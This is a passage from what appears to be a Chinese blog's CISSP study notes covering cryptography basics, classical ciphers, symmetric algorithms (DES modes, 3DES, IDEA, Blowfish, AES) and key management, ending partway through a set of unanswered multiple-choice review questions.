ECCD. El Gamal 什么TCP/IP通信端口被TLS通信所使用?A. 80B. 220C. 443D. 559 什么类型的密码攻击提出了双重DES(2DES)不比标准的DES加密有效?A. 生日攻击B. 选定明文攻击C. 中间相遇攻击D. 中间人攻击 以下哪些工具可以用来提高暴力破解攻击的有效性?A. 彩虹表B. 分级审查C. TKIPD. 随机增强 以下哪个链接会被WPA加密进行保护?A. 防火墙到防火墙B. 路由器到防火墙C. 客户端到无线接入点D. 无线接入点到路由器 使用证书撤销列表的主要缺点是什么?A. 密钥管理B. 延迟c. 记录保留D. 暴力攻击的漏洞 下列加密算法中的哪一个现在被认为是不安全的?A. El GamalB. RSAC. SkipjackD. Merkle-Hellman Knapsack IPSec 定义了什么?A. 针对特定配置的所有可能的安全分类B. 一个用于建立安全通信通道的框架C. Biba模型中的有效过渡状态D. TCSEC安全类别]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（6）——密码学与对称加密算法]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%8E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：安全工程 I. 应用加密学 I.1 密码学生命周期(例如，密码学的局限性、算法/协议的管理) I.2 密码学的种类(对称密码学、非对称密码学、椭圆曲线密码学) I.7 不可否认性 I.8 完整性(哈希和撤盐) 6.1 密码学历史上的里程碑 伴随着人类通信的发展，为了对那些局外人隐藏通信的真正含义，保密的方法应运而生。古人类社会使有复杂的秘密符号系统代表战争中安全的地方。现代文明社会使用多种代码和密码促进个人和组织之间的私人通信。 6.1.1 凯撒密码 凯撒密码简单地将字母表中的每个字母都替换为其后的第三个字母。这是单一字母的替代置换密码，也被称C3密码。 6.1.2 美国内战 在美国内战期间，由于北部联邦和南部联邦的支持者都通过窃听对方的电报线路来刺探情报，因此双方对前线的安全通信都使用了相对先进的密码系统。这些系统使用词汇替代和置换(详细内容参看”密码”部分)的复杂组合，从而试图破坏敌人的破译企图。在内战中广泛使用的另一个系统是由军医Albert J.Myer开发的一系列标记符号。 6.1.3 Ultra 与Enigma 德国军事产业复合体为了官方使用而改造了一种名为Enigma的商业编码机。它使用一系列3到6个转子实现了一种极复杂的替换密码。使用同时代的技术对加密消息进行破译的唯一可行方法是使用类似的机器，这些机器应当具有与传输设备使用的相同转子设置。 同盟国军方开始了一项代号为川剧的绝密工作，其目的是对Enigma编码进行攻击。最终，当波兰军方成功地复原了一台Enigma原型机并且与英国和美国的密码术专家共享了他们的成果时，他们的努力得到了回报。同盟国在1940年成功地破解了Enigma编码，历史学家相信这次成功为最终战胜轴心国起到了重要的作用。 日本人在第二次世界大战期间使用了类似的一台机器，被称为Japanese Purple Machine。美国人对这个密码系统的攻击效果显著，导致日本人的密码在战争结束前就己被破解。 6.2 密码学基础6.2.1 密码学的目标 安全从业人员利用密码系统达到下列4个基本目标： 机密性、完整性、身份认证和不可否认性。实现每个目标都需要满足很多设计需求，并且不是所有的加密系统都要达到所有4个目标。 1. 机密性 机密性确保数据在存储中(例如，存储在磁盘上)或在传输中(例如，在两方或多方之间传递)保持秘密状态。强制实施机密性的密码系统主要有两种类型： 对称密钥密码系统使密码系统中的所有用户都能够使用一个共享的密钥，公钥密码系统使系统中的每个用户都能够使用公钥和私钥的单独组合。当开发以提供保密为目的的加密系统时，你必须考虑两种不同类型的数据： 静态数据或存储数据，是指数据保存在固定和等待接入的位置。静态数据的例子包括存储在硬盘、磁带备份、云存储服务、USB设备和其他存储介质上的数据。 运动中的数据或线缆上的数据，是指在两个系统之间通过网络传输的数据。运动中的数据可能在企业网络、无线网络或公共互联网上进行传输。 2. 完整性 完整性确保数据在传输的过程中不会被修改。完整性检查能确保存储的数据在创建和被访问期间不会遭受篡改。这样做可以防止所有形式的修改： 第三方企图插入错误信息的有意修改以及因传输过程中的错误导致的无意修改。消息完整性通过使用在传输消息时创建的数字签名消息摘要来强制实施。消息的接收者简单地对消息摘要和签名的有效性进行验证，确保消息未在传输过程中修改。公共和私钥密码系统都能够强制实施完整性。 3. 身份认证 身份认证对声明的系统用户身份进行验证，并且是密码系统的主要功能。 4. 不可否认性 不可否认性为接收者提供了担保，保证消息确实来自发送者而不是来自伪装成发送者的人。不可否认性能够防止发送者宣称原先从未发送过信息(也被称为否认消息)。秘密密钥(或对称密钥)密码系统(如简单的替代密码)并不提供对不可否认性的保证。 6.2.2 密码学概念 消息在成为编码形式之前，被称为明文消息，并且在描述加密函数时使用字母P表示。消息的发送者使用密码学算法将明文消息加密为密文消息，并且使用字母C表示。消息通过一些物理的或电子的方式被传送给接收者。接收者随后使用预先确定的算法对密文消息进行解密，从而得到明文形式的消息。 所有密码学算法都依赖密钥来维护其安全性。在很大程度上，密钥只不过是一个数字。密钥往往是一个非常大的二进制数，不过仍然是一个数字。每种算法都具有一个特定的密钥空间。密钥空间是一段值的范围，此范围内的值可作为密钥算法的有效密钥。密钥空间由其位的长度定义。位的长度只不过是密钥中的比特数或位数(0s和1s)。密钥空间的范围为： 从所有位全部为0到所有位全部为1。如果采用另一种方式表示，那么密钥空间的范围为0到2n，其中n是密钥的位的长度。因此，128位密钥的值可以从0到2128(大约为3.40282367* 10^38，这是一个相当大的数字)。保护密钥的安全是非常重要的。事实上，从密码学获得的所有安全性就只能依赖于保证秘密使用密钥的能力。 6.2.3 密码学的数学原理1. 二进制数学 二进制数学定义了一些形成所有计算机神经系统的比特和字节所使用的规则。计算机依赖的二进制系统起源于电。在电流中，只有两种可能的状态： 开(代表存在电流)和关(代表没有电流)。电子设备执行的所有计算都必须利用这些术语来表达，这就出现了现代电子学中对二进制的使用。 2. 逻辑运算 密码学的二进制数学使用多种逻辑函数来操纵数据。 ANDAND 运算(用符号^表示)可以检查两个值是否都为真。在二进制数学中，每个变量都只有两种可能的值，因而为且也函数准备了4种可能的输入。 OROR运算(用符号v来表示)可以检查是否至少有一个输入值为真，只有在两个输入值都为假时，OR函数的结果才会返回假。 NOTNOT 运算(用符号~或!来表示)简单地将输入值取反。 XOR异或(XOR)操作通常用符号⊕表示。只有在一个输入值为真时，XOR函数的结果才为真。如果两个输入值都为假或都为真，那么XOR 函数的结果为假。 3. 模函数 计算机本来也不理解小数系统，并且这些余数在计算机执行很多数学运算时起到了至关重要的作用。模函数十分简单，也就是在完成除法运算后得到余数。 4. 单向函数 单向函数是一种数学运算，它可以通过所有可能的输入值组合得出结果，但是反向得出输入值却是不可能的。公钥密码系统都建立在单向函数的基础上。 5. 随机数 密码学往往通过在加密过程中添加随机性来获得强度。实现这个目标的一种方法是使用随机数。随机数是随机数字发生器，起到了数学函数中占位符变量的作用。执行数学函数时，占位符会被替换为在处理时刻生成的随机数。每次使用数学函数时，随机数都会产生一个独特的数字。随机数的一个更为人接受的示例是初始向量(Initialization Vector，IV)，这是一个与分组长度相同的随机比特串，并且与原始消息相异或。在每次使用相同密钥加密相同的消息时，IV都被用于创建独特的密文。 6. 零知识证明 密码学的一个优点是建立了这样的机制： 在不向第三方揭示事实本身的情况下向第三方证明对事实的了解。这种机制通常涉及密码和其他秘密的身份认证。 7. 分割知识 如果执行某个操作所需的信息或权限在多个用户之间分配时，任何一个人都没有足够的权限来危害环境的安全性。单个解决方案中包含的这种职责分离和两人控制被称为分割知识。分割知识的最佳示例就是密钥托管的概念。通过使用密钥托管，密码密钥、数字签名甚至数字证书，可以被存储在或备份在一种被称为密钥托管数据库的特殊数据库中。 8. 工作函数 通过使用工作函数或工作因数，从成本和/或时间方面来度量所有努力，就可以度量密码学系统的强度。通常，针对加密系统执行完全穷举攻击所需的时间和努力，就是工作函数所表示的内容。密码系统提供的安全性和保护与工作函辈U因数的值成正比。工作函数的大小应当与受保护资产的相对值匹配。工作函数只需稍大于受保护资产的时间值。换句话说，所有安全性(包括密码学)都应当是有效益的和有效率的。保护某个资产所花费的成本不能超过这个资产自身的价值，但是一定要保证提供足够的保护。因此，如果信息由于时间的推移而失去价值，那么工作函数的大小只需确保在数据失去价值前提供保护即可。 6.2.4 密码1. 编码与密码 编码是密码学系统中表示词汇或短语的符号，有时是秘密的，但是不一定提供机密性。编码的常见示例是执法机构使用的通信”10系统”。 在这个系统中，语句”我收到你的信息，并且理解其含义”被表示成编码短语”10-4”这个编码是众人皆知的，但是它确实提供了通信的简易性。一些编码是秘密的。为了传输机密的消息，这些编码可能使用数学函数或密码字典来表示词汇、短语或句子。另一方面，密码总是意味着隐藏消息的真实含义。密码使用各种技术修改和/或重新排列消息中的字符或比特，从而实现机密性。在比特(也就是二进制编码的单个位)、字符(也就是ASCII码消息的单个字符)或分组(也就是一条消息的固定长度分段，通常用比特数表示)的基础上，密码将消息从明文转换为密文。 2. 换位密码 换位密码使用某种加密算法重新排列明文消息中的字母，从而形成密文消息。解密算法只需反演加密转换过程就可以得到原始消息。 3. 替代密码 替代密码使用加密算法将明文消息中的每一个字符或比特都替换为不同的宇符。与换位密码一样，有很多替代密码比本章提供的示例更复杂。多字母替代密码在相同的消息中使用多个字母表来阻碍解密操作。多字母替代密码的一个著名示例是Vigenere密码。虽然多宇母替代能够防范直接的频率分析，但是容易遭受二阶形式的频率分析(也被称为周期分析攻击，这种攻击基于密钥的重复使用进行频率检查)。 4. 一次性填充 一次性填充是一种极为强大的替代密码。一次性填充对明文消息的每个字母都使用一个不同的字母表。它们可以通过下面的加密函数来表示，其中K是以C表示的字母的加密密钥： c = (P + K) mod 26 通常，一次性填充被记为插入函数的一个很长的数字序列。一次性填充的巨大好处是： 如果运用得当，它是一个不可破解的加密方案。由于不存在重复的字母替代模式，这使得密码分析工作徒劳无益。然而，为了确保算法的完整性，必须满足下列几个要求： 加密密钥必须随机生成。使用一个短语或书中的一段话会引入密码分析人员破译这个编码的可能性。 一次性填充必须进行物理保护，以防泄露。如果敌人具有这个一次性填充的副本，那么他们就可以轻易地破译加密的消息。 每个一次性填充必须只使用一次。如果填充被重复使用，那么密码分析人员可以比较多个使用相同填充的加密消息中的相似之处，井有可能确定使用的密钥值。 密钥必须至少与被加密的消息一样长，这是因为每个密钥元素都只对消息中的一个字符进行编码。 一次性填充一直被用于保护极其敏感的通信，不能被广泛使用的主要障碍是很难生成，以及分发和保护所需的冗长密钥。由于密钥的长度问题，一次性填充在实际中只可用于短消息。 5. 滚动密钥密码 密码学的许多脆弱性都涉及密钥的有限长度。通过在加密和解密期间为每个密码转换使用不同的字母表，一次性填充避免了这些脆弱性。然而，因为要求填充的物理交换，所以一次性填充难以实现。对于这个难题，一个常见的解决方案是使用漆动密钥密码，也被称为书籍密码。在这种密码中，加密密钥与消息本身一样辰，并且往往从一般的书籍中选取。 6. 分组密码 分组密码按消息的”组块”或分组进行操作，并且对整个消息分组同时应用加密算法。换位密码就是分组密码的一个例子。在挑战/响应算法中使用的简单算法，是取出完整的词汇井且逆向排列字母。更加复杂的柱状换位密码对整条消息(或一段消息)进行操作，并且使用换位算法和保密密钥对消息进行加密。大多数现代加密算法都实现了某些类型的分组密码。 7. 流密码 流密码对消息、(或数据流)中的每个字符或每一位进行操作，每次只处理一个字符/一位。凯撒密码就是流密码的一个例子。一次性填充也是一种流密码，这是因为该算法对明文信息中的每个宇符独立进行操作。流密码也可以作为一种分组密码使用。在此类情况下，某个缓冲区被填满实时数据，随后这些数据作为分组进行加密井传送给接收方。 7. 混淆与扩散 密码学算法依靠两种基本的操作来隐藏明文信息： 、混淆与扩散。混淆出现在明文和密钥的关系十分复杂时，此时攻击者不能通过继续修改明文和分析产生的密文来确定密钥。扩散出现在明文的改变导致多种变化时，这些变化被扩散到整个密文中。 6. 现代密码学 为了实现密码学的机密性、完整性、身份认证和不可否认性目标，现代密码系统利用计算复杂的算法和长密钥。 6.3.1 密钥 在密码学的早期，其中一条主导原则就是” 通过隐匿实现安全”。密码学家们认为保护加密算法安全的最好办法就是对外人隐藏算法的细节。旧的密码系统要求通信双方保持对信息加密和解密所使用算法的安全性，井且不对第三方泄露。算法的任何泄露都可能导致对于对整个系统的破坏。 现代密码系统并不依赖于其算法的安全性。通过向公众开放审查，实际上也改善了算法的安全性。计算机安全机构对于算法的广泛分析，允许从业人员发现并纠正潜在的安全脆弱性，并且确保他们用于保护通信的算法尽可能安全。现代密码系统不依赖于保密的算法，而是依赖于具体的用户或用户组专用的一个或多个密钥。对换位密码的讨论中曾经提到过，柱状换位中使用的密钥被用于指导加密和解密操作。然而，只要选择了外人猜不出的密钥，柱状换位就可以被用于双方的安全通信。只要密钥的安全性得到维护，那么就不必担心第三方会知道算法的细节。 6.3.2 对称密钥算法 对称密钥算法依赖于一个”共享的秘密”加密密钥，该密钥会被分发给所有参与通信的成员。所有通信成员都使用这个密钥进行消息的加密和解密，因此发送者和接收者都拥有共享密钥的副本。通信两端会使用相同的密钥加密和解密消息。当使用很长的密钥时，对称加密难以被破解。对称密钥算法主要被用于执行批量加密，并且只为安全服务提供机密性。对称密钥密码学也被称为秘密密钥密码学和私有密钥密码学。对称密钥密码学具有下列几个弱点： 密钥分发是一个主要问题 在使用对称密钥协议建立通信之前，通信参与者必须具备一种安全交换密钥的方法。如果没有可用的安全电子通道，那么往往必须使用离线的密钥分发方法(已不属于交换) 。 对密钥密码学井未实现不可否认性 由于任意通信方都可以利用共享的密钥对消息进行加密和解密，因此无法分辨指定消息的来源。 这种算法不可扩展 对于大的用户组来说，使用对称密钥密码进行通信非常困难。只有在每个可能的用户组合共享私有密钥时，组中个人之间的安全专有通信才能实现。 密钥必须经常更新 每当有成员离开用户组时，所有涉及这个成员的密钥都必须被抛弃。 对称密钥密码学的主要强度在于能够以极快的速度进行操作。对称密钥算法的速度很快，通常是非对称密钥算法的1000倍到10000倍之间。鉴于其数学特性，对称密钥密码学还可以在硬件上实现，这为更高速度的运行创造了机会。 6.3.3 非对称密钥算法 非对称密钥算法也被称为公钥算法，它为对称密钥加密的弱点提供了解决方案。在这个系统中，每个用户都有两个密钥： 一个在所有用户之间共享的公钥，以及另一个只有用户自己知道并保管的私钥。但是让人意想不到的是： 相对立的和相关的密钥必须被先后应用于加密和解密。换句话说，如果使用公钥加密消息，那么只有相关的私钥能够进行解密，反之亦然。下面列出了非对称密钥密码学的主要优点： 增加新用户只需要生成一对公钥-私钥对 这个新用户与非对称密码系统中的所有用户通信时都使用这对相同的密钥，从而使得算法非常容易扩展。 从非对称系统中更容易删除用户 非对称算法提供了一种密钥撤消机制，这个机制准许密钥被取消，从而能够有效地从非对称系统中删除用户。 只有在用户的私钥被破坏时，才需要进行密钥重建 如果某位用户离开了公司，那么系统管理员只需要简单地将该用户的密钥作废即可。其他密钥都不会被破坏，因此其他用户都不需要进行密钥重建。 非对称密钥加密提供了完整性、身份认证和不可否认性 如果某位用户没有与其他个体共享其私钥，那么具有该用户签名的消息就是正确无误的，并且具有特定的来源，在以后的任何时刻都不能被否认。 密钥分发是一个简单的过程 希望加入非对称密码系统的用户，只需要使他们的公钥对于所有与他们进行通信的人来说可用就可以了。目前尚无办法从公钥导出私钥。 不需要预先存在通信链接 两个个体可以从通信一开始就进行安全的通信。非对称密码学并不要求预先存在能够提供安全数据交换机制的关系。 公钥密码学的主要弱点是运算速度慢。因此，很多需要安全传输大量数据的应用程序会使用公钥密码学建立连接，然后交换对称密钥。会话任务的剩余部分随后来用对称密码学开始运作。下表比较了对称和非对称密码学系统。仔细查看这个表可以发现，一种系统中的弱点恰好与另一种系统中的优点互补。 对称密码学系统 非对称密码学系统 单个共享的密钥 密钥对 带外交换 带内交换 不可扩展 可扩展 快速 慢速 批量加密 小块数据分组、数字签名、数字封装、数字证书 机密性 完整性、机密性、身份认证、不可否认性 6.3.4 散列算法目前常用的一些散列算法： 消息摘要2(MD2) 消息摘要5(MD5) 安全散列算法(SHA-0、SHA-l和SHA-2) 基于散列的消息身份认证代码(Hashed Message Authentication Code，HMAC) 6.4 对称密码6.4.1 数据加密标准 美国政府在1977年公布了数据加密标准(DES)，并且将之作为向所有政府通信而提议的标准密码系统。由于该算法中的缺陷，密码学界和政府不再认为DES是安全的。大家普遍相信情报机构已经能轻易破解DES加密的信息。DES在2001年12月被高级加密标准取代。 DES是一个64位的分组密码，具有5种操作模式： 电子代码本(Electronic CodeBook，ECB)模式、密码分组链接(Cipher Block Chaining，CBC)模式、密码回馈(Cipher FeedBack，CFB)模式以及输出回馈(Output FeedBack，OFB)模式和计数(CounTeR，CTR)模式。这些模式将在接下来的内容中进行阐述。所有DES模式每次处理64位的明文，并且生成一个64位的密文分组。DES使用的密钥长度为56位。DES 利用长序列的异或(XOR)操作生成密文。每个加密/解密操作都要重复16次这个过程，每次重复通常被称为”一轮”加密，因此DES要执行16轮加密。 1. 电子代码本模式 电子代码本(ECB)模式是最容易了解的模式，但安全性最差。这个算法每次处理一个64位分组，它简单地使用所选择的密钥对这个分组进行加密。这意味着如果算法多次遇到相同的分组，那么将产生完全相同的加密分组。除了最短传输之外，这个脆弱性使得通过ECB模式进行传输并不现实。在日常使用中，ECB只被用于交换少量数据。例如，启动其他DES模式的密钥和参数以及数据库中的单元。 2. 密码分组链接模式 在密码分组链接(CBC)模式中，未加密文本的每个分组在使用DES算法加密之前，都与前一密文分组进行异或操作。解密过程简单地将密文解密，并且反向执行异或操作。CBC创建了一个IV，并且将这个IV与消息的第一个分组相异或，从而每次操作都生成独特的输出。IV必须被发送给接收方，我们既可以将IV以明文形式置于完整的密文之前，也可以使用与消息所用的相同的密钥通过ECB加密模式保护它。在使用CBC 模式时，需要考虑的一个重要问题是错误传播，也就是如果一个分组在传输中被破坏，那么这个分组将无法解密，并且下一个分组也是如此。 3. 密码回馈模式 密码回馈(CFB)模式是流密码形式的CBC。换句话说，CFB针对实时生成的数据进行操作。不过，CFB并不将消息分为若干分组，而是使用相同分组大小的内存缓冲区。在缓冲区被填满时，对数据进行加密并发送给接收方。接着，系统等待下一个缓冲区被新生成的数据填满，然后继续进行加密和传输。除了将先前存在的数据变化为实时数据，CFB的操作方式与CBC一样，也使用了IV和链接。 4. 输出回馈模式 在输出回馈(OFB)模式中，DES的操作样式几乎与在CFB模式中的操作样式完全相同。不过，DES并不将明文分组与前一个密文分组的加密版本相异或，而是将明文与某个种子值相异或。对于第一个被加密的分组来说，初始向量被用于创建种子值。通过对先前的种子值运行DES算法，就可以派生出之后的种子值。OFB模式的主要优点是不存在链接功能，并且传输错误不会通过传播影响之后分组的解密。 5. 计数模式 在计数(CTR)模式中运行的DES使用的流密码，类似于在CFB和OFB模式中使用的流密码。不过，这种模式并不根据前一个种子值的结果为每个加密/解密操作创建种子值，而是使用一个简单的、每次操作后都增加的计数。与OFB模式一样，CTR模式中也不传播错误。 6.4.2 三重数据加密算法(3DES) 3DES具有4种版本。第1种版本只是使用三个不同的密钥(K1、K2和K3)对明文加密三次。它被称为DES-EEE3模式(三个E表示存在三个加密操作，而数字3表示使用三个不同的密钥)，这种模式可以利用下面的符号来表示，其中E(K，P)表示使用密钥K加密明文P： E(K1，E(K2，E(K3，P))) DES-EEE3 具有的密钥的有效长度为168位。 第2种3DES版本DES-EDE3也使用三个密钥，但是将第二个加密操作替换为解密操作，如下所示： E(K1，D(K2，E(K3，P))) 第3种3DES版本DES-EEE2只使用两个密钥Kl和K2，如下所示： E(K1，E(K2，E(Kl，P))) 第4种3DES版本DES-EDE2也使用两个密钥，但是在中间使用一个解密操作，如下所示： E(K1，D(K2E(K1，P))) 第3种和第4种3DES 版本具有的密钥的有效长度都为112位。 6.4.3 国际数据加密算法(IDEA) 国际数据加密算法(IDEA)的分组密码是针对DES算法的密钥长度不够而开发的。与DES一样，IDEA对64位的明文/密文分组进行操作。然而，国际数据加密算法采用128位的密钥进行操作。这个密钥随后在一系列操作中被分解成52个16位的子密钥。这些子密钥接着使用异或和模运算的组合对输入的文本进行操作，从而生成输入消息的加密/解密版本。IDEA能够在DES使用的4种模式(ECB、CBC、CFB和OFB)中工作。 6.4.4 Blowfish Bruce Schneier的Blowfish分组密码是DES和IDEA的另一种选择。与它的这些前辈们一样，Blowfish对64位文本分组进行操作。然而，Blowfish扩展了IDEA的密钥强度，甚至准许使用变长密钥，范围从相对不安全的32位到相当难破解的448位。很显然，较长的密钥将导致加密/解密时间的相应增加。不过，计时试验已经表明，Blowfish是比IDEA和DES更快的算法。 6.4.5 Skipjack Skipjack算法由美国政府在联邦信息处理标准(Federal Information Processing Standard，FIPS)185，即托管加密标准证书(Escrowed Encryption Standard，EES)中批准使用。与许多分组密码一样，Skipjack对64位的文本分组进行操作。这种算法使用一个80位的密钥，并且支持DES支持的相同4种操作模式。 6.4.6 高级加密标准(AES) AES密码准许使用三种密钥强度：128位、192位和256位。AES最初的规范支持128位分组的处理，但是Rijndael超出了这个规范，它准许密码学家使用与密钥长度相等的分组大小。如下所示，加密的轮数依赖于所边的密钥长度： 128位密钥需要10轮加密。 192位密钥需要12轮加密。 256位密钥需要14轮加密。 下表列出了某些常见且著名的对称加密算法及其分组大小和密钥大小： 算法名 分组大小(单位为位) 密钥大小(单位为位) 数据加密标准(DES) 64 56 三重DES(3DES) 64 112或168 高级加密标准(AES) 128 128、192、256 Rijndael 可变 128、192、256 Twofish 128 1-256 Blowfish(通常在SSH中使用) 64 32-448 IDEA(在PGP中使用) 64 128 基于RSA的Rivest密码5(RC5) 32、64、128 0-2040 基于RSA的Rivest密码4(RC4) 流式 128 基予RSA的Rivest密码2(RC2) 64 128 Skipjack 64 80 6.4.7 对称密钥管理 由于加密密钥中包含的信息对于密码系统而言是至关重要的，因此密码系统的管理员和用户必须采取特殊的措施以保护密钥材料的安全。这些安全措施被统称为密钥管理实践。它们包含密钥的生成、分发、存储、销毁、恢复和托管。 1. 创建和分发对称密码 离线分发 在技术方面最简单的方法涉及密钥材料的物理交换。一方向另一方提供包含密钥的一张纸或一份存储介质。在很多硬件加密设备中，密钥材料以电子设备的形式存在，这类似于插入到加密设备中的真实的钥匙。然而，这些方法都具有各自固有的缺陷。如果通过电子邮件发送密钥材料，那么密钥材料就可能被截获。电话可能会被窃听。包含密钥的纸张则可能被无意丢进废纸篓或丢失。 公钥加密 许多通信人员希望在没有密钥分发之争的情况下获得密钥加密的速度优势。因此，许多人使用公钥加密来建立初始的通信链接。一旦链接成功建立，并且双方对相互的身份都感到满意，那么他们就会在安全的公钥链接上交换密钥。随后，通信双方从基于公钥算法的通信进入基于秘密密钥算法的通信，并且能够享受快速的处理过程。一般而言，与公钥加密相比，私有密钥加密的速度快数千倍。 Diffie-Hellman算法 某些情况下，无论是公钥加密还是离线分发，都是不充分的。双方可能需要相互通信，但是他们没有物理手段交换密钥材料，并且没有适当的公钥基础设施来促进秘密密钥的交换。在这样的情况下，像Diffie-Hellman这样的密钥交换算法被证明是极为有用的机制。 2. 存储和销毁对称密钥 在对称密钥加密中，另一个主要的挑战是在密码系统中使用的密钥必须进行安全保管。以下给出了存储加密密钥的最佳实践： 永远不要将加密密钥存储在存放加密数据的同一个系统中，这将使攻击者更容易进行攻击! 对于敏感的密钥，可以考虑两个不同的人分别持有密钥的一半。他们必须合在一起才能构成完整的密钥。这是众所周知的知识分割原则(己在本章前面提到)。 当知道密钥的用户离开组织或不再被允许访问通过密钥包含的材料时，密钥必须更改，同时使用该密钥进行加密的所有材料必须用新的密钥进行重新加密。销毁一个密钥并将一个用户从对称密码系统中移除是困难的，这也是组织转而使用非对称算法的一个重要原因。 3. 密钥托管 在过去10年中，人们提议通过下列两种主要途径进行密钥托管： 公平密码系统 在这种托管方法中，通信中使用的私有密钥被分为两个或多个部分，这些部分都被交给独立的第三方。每个部分本身都是无用的，但是通过重新组合可以获得私有密钥。政府获得法律授权访问特定的密钥时，需要向所有第三方提供法院的证据，随后才能重新组装这个私有密钥。 托管加密标准 这种托管方法向政府提供解密密文的技术手段。这个标准是本章前面讨论的Skipjack算法的基础。 6.4.8 密码生命周期 安全专家在选择一个加密算法和相应的管理控制措施时必须考虑密码的生命周期以确保算法、协议和选择的密钥长度足以保存密码系统的完整性，以确保能够用于保护所需时间内信息的完整性和安全性。安全专家可以使用以下算法和协议管理控制： 确定组织内可以接受和使用的加密算法(例如，AES、3DES和RSA) 。 基于传输信息的敏感性确定每个算法可接受使用的密钥长度。 列出可以使用的安全传输协议(如SSL和TLS) 。 6.5 考试要点 理解机密性、完整性和不可否认性在密码系统中扮演的角色 机密性是密码学的一个主要目标，它确保信息不对未授权的个人泄漏，并且准许加密信息、以在开放的网络中自由传输。对称和非对称密码系统都能够保证机密性。完整性为消息的接收方提供了消息在发送者建立和接收者接收到的时间范围内没有被(有意或无意)修改的保证。对称和非对称密码系统都能够保证完整性。不可否认性提供了不可否认的证据，从而证明消息的发送者确实是这个消息的作者。它防止发送者否认他们发送了原始信息。 了解如何使用密码系统达到身份认证的目标 身份认证提供了对用户身份的保证。使用身份认证的一种可能方案是挑战/响应协议，其中的远程用户被要求使用只有通信双方知道的密钥对消息进行加密。对称和非对称的密码系统都可以实现身份认证。 熟悉密码学的基本术语 当发送者希望向接收者传送一份私有消息时，发送者会取出明文(未加密的)消息，并且使用某种算法和某个密钥对明文消息进行加密，从而生成发送给接收者的密文消息。接收者随后使用相似的算法和密钥对密文进行解密，并且重建原始的明文消息以供查看。 理解编码和密码之间的区剔，井且能够解释密码的基本类型 编码是对词汇或短语操作的符号密码学系统，有时是隐秘的，但是并不能永远提供机密性。不过，密码永远意味着对消息的真实含义进行隐藏。了解下列密码类型的工作方式： 换位密码、替代密码(包括一次性填充)、流密码以及分组密码。 了解成功应用一次性填充的要求 要获得成功的一次性填充，密钥必须随机生成，并且不使用任何己知的模式。密钥必须至少和被加密的消息一样长。填充必须防止物理泄露，并且每个填充在被丢弃前必须只使用一次。 理解零知识证明的概念 零知识证明是一个通信概念。正如数字签名和数字证书一样，零知识证明交换特定类型的信息，但是不传输实际的数据。 理解知识分割 分割知识意味着执行某个操作所需的知识或权限在多个用户之间分配，这样可以确保任何一个人都没有足够的权限来危害环境的安全性。”M of N控制”是分割知识的一个示例。 理解工作函数(工作因数) 工作函数或工作因数通过度量解密消息所需的成本和/或时间，来度量密码学系统的强度。通常，针对加密系统执行完全穷举攻击所需的时间和努力就是工作函数所表示的内容。密码系统提供的安全性和保护与工作函数/因数的值成正比。 理解密钥安全性的重要性 密码学密钥为密码系统提供秘密性的必要组件。现代密码系统使用至少128位的密钥来提供足够的安全性。通常，人们都赞同数据加密标准。(DES)56位密钥的长度己无法提供足够的安全性。 了解对称和非对称密钥系统之间的差异 对称密钥密码系统(或密钥密码系统)依赖于一个共享密钥的使用。它们的速度远远快于非对称算法，但是缺乏对可扩展性、简单密钥分发和不可否认性的支持。非对称密码系统对双方之间的通信使用公共/私钥对，但是要比对称算法的操作速度慢得多。 能够解释数据加密标准(DES)和三重DES(3DES)的基本操作模式 数据加密标准具有4 种操作模式： 电子代码本(ECB)模式、密码分组链接(CBC)模式、密码回馈(CFB)模式和输出回馈(OFB)模式。ECB模式被认为是最不安全的，并且只用于短消息。3DES使用DES的三次选代，利用两或三个不同的密钥，从而将密钥的有效强度各自增加到112位或168位。 了解高级加密标准(AES) 高级加密标准使用Rijndael算法，并且是美国政府安全交换敏感但非分类数据的标准。AES使用128、192和256位的密钥和固定128位大小的分组达到比旧的DES算法高得多的安全性。 6.6 复习题 4位的密钥空间存在多少个密钥?A. 4B. 8C. 16D. 128 Jolm近期收到一封来自Bill的电子邮件。需要满足什么密码学目标，才能让John相信Bill是这封邮件的发送者?A. 不可否认性B. 机密性C. 可用性D. 完整性 数据加密标准(DES)密码系统中使用的密钥长度是多少?A. 56位B. 128位C. 192位D. 256位 什么类型的加密方式，依赖于不断变化消息中字符的位置去实现机密性?A. 流加密B. 换位加密C. 块加密D. 替换加密 下列哪一个不是高级加密标准Rijndael算法可能的密钥长度?A. 56位B. 128位C. 192位D. 256位 秘密密钥加密系统不能实现下列哪一项?A. 不可否认性B. 机密性C. 可用性D. 密钥分发 如果配置正确，己知唯一的牢不可破的加密系统是什么?A. 换位密码B. 替代密码C. 高级加密标准D. 一次性填充 数学函数16模3的输出值是多少?A. 0B. 1C. 3D. 5 在20世纪40年代，一队来自美国的密码破译专家成功破解了基于一次一密的被称为VENONA的项目。该项目破坏了什么规则，导致引起这个事件?A. 密钥值必须随机B. 密钥值必须和信息一样长C. 密钥值必须仅能被用一次D. 密钥值必须防止物理泄露 以下密码类型中，哪一项对大块的消息而不是单个字符或位的消息进行操作?A. 流加密B. 凯撒加密C. 块加密D. ROT3加密 为了通过使用对称加密算法对双向通信进行保护，需要的加密密钥的最小数目是多少?A. 1B. 2C. 3D. 4 Dave正在开发一个需要多人才能取回密钥的密钥托管系统，但并不依靠每个参与者到现场。他正在使用什么类型的技术?A. 分割知识B. M of N控制C. 工作函数D. 零知识证明 下面哪种数据加密标准(DES)操作模式能被用于大量信息，确保在加密/解密过程中不会因为一个早期的错误而破坏整个通信?A. 密码分组链接(CBC)B. 电子代码本(ECB)C. 密码回馈(CFB)D. 输出回馈(OFB) 许多加密算法依赖于分解大素数乘积的难题。它们依靠的这个问题的特点是什么?A. 包含扩散B. 包含泪淆C. 包含单向函数D. 遵照Kerchoff原则 全面实现有10人参与的对称算法需要多少个密钥?A. 10B. 20C. 45D. 100 高级加密标准使用的分块大小是多少?A. 32位B. 64位C. 128位D. 可变 什么样的攻击，使得凯撒密码几乎无法使用?A. 中间人攻击B. 托管攻击C. 频率分析攻击D. 换位攻击 什么类型的密码系统经常利用一个通道，借助一本著名的书来加密密钥?A. Vernam 加密B. 